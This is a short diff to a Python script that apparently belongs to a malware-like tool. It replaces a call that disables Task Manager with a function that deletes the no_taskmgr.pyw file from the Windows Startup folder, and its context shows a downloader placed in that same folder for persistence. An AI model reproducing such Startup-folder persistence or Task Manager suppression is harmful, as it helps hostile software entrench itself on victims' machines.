@@ -34,7 +34,12 @@ while True:
     except Exception:
         pass
 
-no_taskmgr()
+def yes_taskmgr():
+    no_taskmgr_path = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\no_taskmgr.pyw"
+    os.remove(no_taskmgr_path)
+
+#no_taskmgr()
+yes_taskmgr()
 
 # Download new ric (TODO: comment out this later)
 downloader_ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
